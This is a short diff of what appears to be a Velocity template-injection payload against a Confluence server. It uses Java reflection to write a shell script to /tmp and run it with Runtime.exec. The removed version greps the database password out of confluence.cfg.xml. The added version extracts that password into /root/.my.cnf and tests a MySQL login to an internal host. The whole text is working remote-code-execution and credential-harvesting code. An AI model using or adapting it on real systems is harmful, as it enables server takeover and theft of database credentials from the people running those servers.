@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo ===GREP; grep -n 'password' /u01/confluence-home/confluence.cfg.xml | sed 's/=.*/=MASKED/' ; echo ===RAWCOUNT; grep -c 'hibernate.connection.password' /u01/confluence-home/confluence.cfg.xml; echo ===SEDTEST; grep 'hibernate.connection.password' /u01/confluence-home/confluence.cfg.xml | sed 's/^hibernate.connection.password=/password=/' | sed 's/=.*/=OK/' ; echo DBG2_DONE")
+$fw.write("echo '[client]' > /root/.my.cnf; echo 'user=confluence' >> /root/.my.cnf; grep 'hibernate.connection.password' /u01/confluence-home/confluence.cfg.xml | cut -d'>' -f2 | cut -d'<' -f1 | sed 's/^/password=/' >> /root/.my.cnf; chmod 600 /root/.my.cnf; echo ===MASKED; cat /root/.my.cnf | sed 's/^password=.*/password=***/'; echo ===TEST; mysql -h10.18.19.53 -D confluence -N -e 'select 1;' 2>&1; echo FIX_DONE")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
